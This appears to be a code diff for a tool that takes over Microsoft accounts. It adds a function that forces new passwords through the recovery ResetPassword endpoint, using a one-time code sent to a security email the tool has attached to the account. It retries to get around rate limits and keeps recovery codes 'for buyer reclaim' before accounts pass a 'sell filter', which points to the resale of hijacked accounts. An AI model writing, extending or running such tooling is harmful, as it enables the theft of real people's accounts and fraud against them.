@@ -11,7 +11,11 @@ from securing.auth.initial_session import get_session
 from securing.utils.proxy import close_session
 from securing.utils.security.change_password import change_password_authenticated
 from securing.utils.security.password_gen import generate_ms_password
-from securing.utils.security.recovery import recover, verify_password_works
+from securing.utils.security.recovery import (
+    recover,
+    reset_password_via_security_email_otp,
+    verify_password_works,
+)
 
 logger = logging.getLogger(__name__)
 
@@ -41,6 +45,59 @@ async def _fresh_verify(email: str, password: str, *, settle_delay: float) -> st
         await close_session(probe)
 
 
+async def force_password_via_otp(
+    *,
+    email: str,
+    security_email: str,
+    preferred_password: str | None = None,
+) -> tuple[str, bool]:
+    """Set password via ResetPassword.aspx + security-email OTC (HAR path).
+
+    Returns ``(password, verified_ok)``.
+    """
+    pwd = strip_unverified(preferred_password) or generate_ms_password(16)
+    if not email or not security_email:
+        return pwd, False
+
+    print("[~] - Force password via security-email OTP ResetPassword…")
+    try:
+        ok = await reset_password_via_security_email_otp(email, security_email, pwd)
+    except Exception as exc:
+        logger.exception("force password OTP ResetPassword raised: %s", exc)
+        print(f"[X] - OTP ResetPassword error: {exc.__class__.__name__}")
+        return pwd, False
+
+    if not ok:
+        # One retry with a fresh password (banned / contested edge cases)
+        pwd = generate_ms_password(16)
+        print("[~] - OTP ResetPassword retry with fresh password…")
+        try:
+            ok = await reset_password_via_security_email_otp(
+                email, security_email, pwd
+            )
+        except Exception:
+            logger.exception("force password OTP retry raised")
+            return pwd, False
+        if not ok:
+            return pwd, False
+
+    status = await _fresh_verify(email, pwd, settle_delay=8.0)
+    print(f"[~] - Post-OTP-ResetPassword verify => {status}")
+    if status == "ok":
+        print("[+] - Password forced OK via security-email OTP")
+        return pwd, True
+    if status == "unknown":
+        status2 = await _fresh_verify(email, pwd, settle_delay=15.0)
+        print(f"[~] - Post-OTP-ResetPassword delayed => {status2}")
+        if status2 == "ok":
+            print("[+] - Password forced OK via OTP (delayed verify)")
+            return pwd, True
+        # API said OK — treat non-bad as success (login rate-limit noise)
+        if status2 != "bad":
+            return pwd, True
+    return pwd, status == "ok"
+
+
 async def force_password_after_recover(
     session: httpx.AsyncClient,
     *,
@@ -48,25 +105,38 @@ async def force_password_after_recover(
     security_email: str,
     recovery_code: str,
     preferred_password: str | None = None,
-    max_attempts: int = 5,
+    max_attempts: int = 3,
+    try_otp_first: bool = True,
 ) -> tuple[str, str, bool]:
-    """Retry RecoverUser until the password verifies, or attempts are exhausted.
+    """Retry password set until verify OK.
 
-    RecoverUser can return a new recovery code + attach security email while
-    silently ignoring the ``password`` field. Format is not the issue (mixed
-    case alnum 14+ is fine — live logs show the same format both OK and BAD).
-    MS just flakes. Re-running RecoverUser with the *new* recovery code forces
-    another password write.
+    Order (from live HAR reverse-engineering):
+      1. Security-email OTP → ``/API/Recovery/ResetPassword`` (most reliable
+         when RecoverUser already attached our proof but ignored password)
+      2. RecoverUser retries with the current recovery code (RC rotation)
 
     Returns ``(password, recovery_code, verified_ok)``.
     """
     pwd = strip_unverified(preferred_password) or generate_ms_password(16)
     rc = (recovery_code or "").strip()
-    if not rc or not email or not security_email:
+    if not email or not security_email:
+        return pwd, rc, False
+
+    # 1) HAR path first — does not burn recovery codes
+    if try_otp_first:
+        pwd, ok = await force_password_via_otp(
+            email=email,
+            security_email=security_email,
+            preferred_password=pwd,
+        )
+        if ok:
+            return pwd, rc, True
+
+    if not rc:
+        print("[X] - No recovery code for RecoverUser force")
         return pwd, rc, False
 
     for attempt in range(1, max_attempts + 1):
-        # Fresh password each attempt — avoid MS caching an ignored value
         if attempt > 1 or not preferred_password:
             pwd = generate_ms_password(16)
         print(
@@ -78,29 +148,51 @@ async def force_password_after_recover(
         except Exception as exc:
             logger.exception("force password RecoverUser raised: %s", exc)
             print(f"[X] - Force password RecoverUser error: {exc.__class__.__name__}")
+            # After RecoverUser 500, try OTP path again (proof may still work)
+            pwd2, ok2 = await force_password_via_otp(
+                email=email,
+                security_email=security_email,
+                preferred_password=pwd,
+            )
+            if ok2:
+                return pwd2, rc, True
             continue
 
         if not new_rc or new_rc == "invalid":
             print("[X] - Force password RecoverUser soft-failed")
+            pwd2, ok2 = await force_password_via_otp(
+                email=email,
+                security_email=security_email,
+                preferred_password=pwd,
+            )
+            if ok2:
+                return pwd2, rc, True
             continue
 
         rc = new_rc
-        # Fresh session — avoid cookie pollution / rate-limit from prior verifies
         status = await _fresh_verify(email, pwd, settle_delay=8.0)
         print(f"[~] - Force password verify => {status}")
         if status == "ok":
             print("[+] - Password forced OK after RecoverUser retry")
             return pwd, rc, True
         if status == "unknown":
-            # Soft/rate-limit — longer settle then same pwd once more (no new RecoverUser)
             status2 = await _fresh_verify(email, pwd, settle_delay=15.0)
             print(f"[~] - Force password delayed re-check => {status2}")
             if status2 == "ok":
                 print("[+] - Password forced OK after delayed re-check")
                 return pwd, rc, True
-            # Stay on this password; next loop will RecoverUser again
 
-    print("[X] - Could not force password to stick after RecoverUser retries")
+        # RecoverUser claimed OK but password didn't stick → HAR OTP path
+        pwd3, ok3 = await force_password_via_otp(
+            email=email,
+            security_email=security_email,
+            preferred_password=pwd,
+        )
+        if ok3:
+            return pwd3, rc, True
+        pwd = pwd3
+
+    print("[X] - Could not force password to stick after OTP + RecoverUser retries")
     return pwd, rc, False
 
 
@@ -111,7 +203,7 @@ async def ensure_password_verified(
     force_if_unverified: bool = True,
     force_if_bad: bool = True,
 ) -> bool:
-    """Verify microsoft.password; ChangePassword / RecoverUser if bad / UNVERIFIED.
+    """Verify microsoft.password; ChangePassword / OTP Reset / RecoverUser if bad.
 
     Mutates ``account_info["microsoft"]`` in place.
     Returns True if password is verified (or verify inconclusive / unknown).
@@ -141,7 +233,6 @@ async def ensure_password_verified(
         return True
 
     if status == "unknown":
-        # Rate-limit / soft-block — one longer settle before deciding
         status = await _fresh_verify(email, clean, settle_delay=12.0)
         print(f"[~] - ensure_password_verified delayed => {status}")
         if status == "ok":
@@ -150,7 +241,6 @@ async def ensure_password_verified(
             return True
         if status == "unknown" and not marked:
             return True
-        # marked + still unknown: try ChangePassword below (don't hard-reject yet)
 
     if status not in ("bad", "unknown") and not marked:
         return True
@@ -161,10 +251,9 @@ async def ensure_password_verified(
             account_info["microsoft"] = ms
             return False
 
-        # 1) Authenticated ChangePassword (OTP session already elevated).
-        # Do NOT send currentPassword first — RecoverUser often ignored the
-        # password field so `clean` is not the real current credential.
         pwd = clean or generate_ms_password(16)
+
+        # 1) Authenticated ChangePassword (needs real Change-page ticket)
         if force_if_unverified or force_if_bad:
             print("[~] - Trying authenticated ChangePassword…")
             changed = await change_password_authenticated(session, pwd)
@@ -187,20 +276,21 @@ async def ensure_password_verified(
                         ms["password"] = pwd
                         account_info["microsoft"] = ms
                         return True
-                # Brand-new password once more via ChangePassword
-                pwd2 = generate_ms_password(16)
-                print("[~] - ChangePassword retry with fresh password…")
-                if await change_password_authenticated(session, pwd2):
-                    status4 = await _fresh_verify(email, pwd2, settle_delay=8.0)
-                    print(f"[~] - Post-ChangePassword(2) verify => {status4}")
-                    if status4 == "ok":
-                        ms["password"] = pwd2
-                        account_info["microsoft"] = ms
-                        return True
-                    if status4 != "bad":
-                        pwd = pwd2
 
-        # 2) One RecoverUser force only — more attempts just rate-limit login.live.com
+        # 2) HAR path: security-email OTC → /API/Recovery/ResetPassword
+        if sec:
+            forced_pwd, ok = await force_password_via_otp(
+                email=email,
+                security_email=sec,
+                preferred_password=pwd,
+            )
+            if ok:
+                ms["password"] = forced_pwd
+                account_info["microsoft"] = ms
+                return True
+            pwd = forced_pwd
+
+        # 3) RecoverUser force (OTP already tried above)
         if sec and rc and rc not in {"Couldn't Change!", "Failed to generate"}:
             forced_pwd, new_rc, ok = await force_password_after_recover(
                 session,
@@ -208,7 +298,8 @@ async def ensure_password_verified(
                 security_email=sec,
                 recovery_code=rc,
                 preferred_password=pwd or None,
-                max_attempts=1,
+                max_attempts=2,
+                try_otp_first=False,
             )
             ms["recovery_code"] = new_rc
             rc = new_rc
@@ -218,13 +309,11 @@ async def ensure_password_verified(
                 return True
             pwd = forced_pwd
 
-        # 3) Still unverified — if recovery code is valid, keep clean password + RC
-        # so the sell filter can allow (buyer can reclaim). Otherwise mark UNVERIFIED.
         rc_norm = str(ms.get("recovery_code") or rc or "").strip().upper().replace(" ", "")
         rc_ok = bool(re.fullmatch(r"[A-Z0-9]{5}(?:-[A-Z0-9]{5}){4}", rc_norm))
         if rc_ok:
             print(
-                "[!] - Password still unverified after ChangePassword — "
+                "[!] - Password still unverified after ChangePassword/OTP — "
                 "keeping recovery code for buyer reclaim"
             )
             ms["password"] = pwd
